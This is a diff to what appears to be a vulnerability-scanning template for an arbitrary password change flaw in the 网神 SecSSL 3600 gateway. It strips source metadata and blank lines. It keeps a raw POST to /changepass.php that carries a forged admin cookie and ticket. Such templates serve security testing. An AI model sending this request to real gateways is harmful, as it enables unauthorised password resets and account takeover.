@@ -3,22 +3,14 @@ info:
   name: 网神 SecSSL 3600安全接入网关系统 任意密码修改漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/isfqtfven6gzc139
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: isfqtfven6gzc139
-    fofa: 暂无
 http:
 - raw:
   - 'POST /changepass.php?type=2  HTTP/1.1
 
 
     Cookie: admin_id=1;
-
-
 
 
     gw_user_ticket=ffffffffffffffffffffffffffffffff;
